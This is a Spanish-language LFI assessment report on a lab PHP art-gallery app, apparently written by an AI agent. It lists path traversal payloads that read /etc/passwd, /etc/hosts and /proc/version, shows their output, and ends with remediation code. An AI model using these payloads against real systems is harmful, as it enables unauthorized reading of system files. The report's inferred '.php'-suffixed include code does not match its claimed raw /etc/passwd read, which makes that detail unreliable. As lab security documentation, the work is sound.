# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 15:51:33  
**Objetivo:** http://web.dev.local:8081  
**Analista:** GitHub Copilot CLI  
**Clasificación:** CRÍTICO

---

## 1. Resumen Ejecutivo

Se identificó y explotó exitosamente una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual". La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante manipulación del parámetro `page` en el endpoint `gallery.php`.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | Local File Inclusion (LFI) |
| **CVSS Score (estimado)** | 7.5 (Alto) |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') |
| **URL afectada** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro vulnerable** | `page` |
| **Método HTTP** | GET |

---

## 3. Proceso de Descubrimiento

### 3.1 Reconocimiento inicial

Al acceder a `http://web.dev.local:8081/`, se identificó una aplicación PHP denominada "Galería de Arte Virtual" con las siguientes páginas/rutas:

- `gallery.php?page=modern`
- `gallery.php?page=classic`
- `gallery.php?page=abstract`
- `gallery.php?page=about`

El parámetro `page` llama dinámicamente a archivos del servidor, lo que indica un potencial punto de inclusión de ficheros.

### 3.2 Prueba de Path Traversal

Se probó la siguiente URL con secuencias de path traversal (`../`):

```
GET /gallery.php?page=../../../etc/passwd
```

**Resultado:** El servidor devolvió el contenido completo del archivo `/etc/passwd`, confirmando la vulnerabilidad.

---

## 4. Explotación

### 4.1 Lectura de `/etc/passwd`

**Payload:** `../../../etc/passwd`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../etc/passwd`

**Contenido obtenido:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 4.2 Lectura de `/etc/hosts`

**Payload:** `../../../etc/hosts`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../etc/hosts`

**Contenido obtenido:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
ff00::      ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
172.19.0.2  d5054e367753
```

### 4.3 Lectura de `/proc/version`

**Payload:** `../../../proc/version`  
**URL:** `http://web.dev.local:8081/gallery.php?page=../../../proc/version`

**Contenido obtenido:**
```
Linux version 6.8.0-110-generic (buildd@lcy02-amd64-115) 
(x86_64-linux-gnu-gcc-13 (Ubuntu 13.3.0-6ubuntu2~24.04.1) 13.3.0, 
GNU ld (GNU Binutils for Ubuntu) 2.42) #110-Ubuntu SMP PREEMPT_DYNAMIC 
Thu Mar 19 15:09:20 UTC 2026
```

---

## 5. Análisis Técnico

### 5.1 Causa raíz

La aplicación usa directamente el valor del parámetro `page` para incluir archivos PHP del servidor, sin aplicar ningún tipo de validación, sanitización o restricción de directorio. El error mostrado cuando se usa ruta absoluta revela la lógica interna:

```
El archivo solicitado no existe: pages//etc/passwd.php
```

Esto indica que el código PHP es similar a:

```php
$page = $_GET['page'];
include("pages/" . $page . ".php");
```

La concatenación directa sin restricciones de directorio (`realpath`, `basename`, listas blancas) permite el path traversal.

### 5.2 Por qué funciona el path traversal

- La ruta `pages/../../../etc/passwd` se resuelve como `/etc/passwd` a nivel de sistema operativo
- No se aplica `realpath()` para canonicalizar la ruta
- No existe lista blanca de páginas permitidas
- No hay restricción del directorio base (`open_basedir`)

---

## 6. Impacto

| Riesgo | Descripción |
|--------|-------------|
| **Confidencialidad** | Lectura de cualquier archivo legible por `www-data` en el sistema |
| **Usuarios del sistema** | Enumeración de usuarios del sistema mediante `/etc/passwd` |
| **Configuración** | Posible lectura de archivos de configuración con credenciales |
| **Código fuente** | Potencial lectura del código fuente PHP de la aplicación |
| **Escalada** | Si existe Log Poisoning, puede derivar en RCE (Remote Code Execution) |

---

## 7. Recomendaciones

1. **Implementar lista blanca** de páginas permitidas:
   ```php
   $allowed = ['modern', 'classic', 'abstract', 'about'];
   if (!in_array($_GET['page'], $allowed)) {
       die("Página no permitida");
   }
   include("pages/" . $_GET['page'] . ".php");
   ```

2. **Usar `basename()`** para eliminar componentes de directorio:
   ```php
   $page = basename($_GET['page']);
   ```

3. **Configurar `open_basedir`** en PHP para restringir el acceso al sistema de ficheros.

4. **Validar con `realpath()`** que la ruta resultante esté dentro del directorio permitido:
   ```php
   $base = realpath('./pages/');
   $path = realpath('./pages/' . $_GET['page'] . '.php');
   if (strpos($path, $base) !== 0) die("Acceso denegado");
   ```

---

## 8. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de Local File Inclusion que permite la lectura arbitraria de archivos del sistema. Se confirmó la explotación exitosa con la lectura de `/etc/passwd`, `/etc/hosts` y `/proc/version`. Se recomienda corrección inmediata mediante validación estricta del parámetro de entrada.

---

*Informe generado automáticamente - Laboratorio de Seguridad*
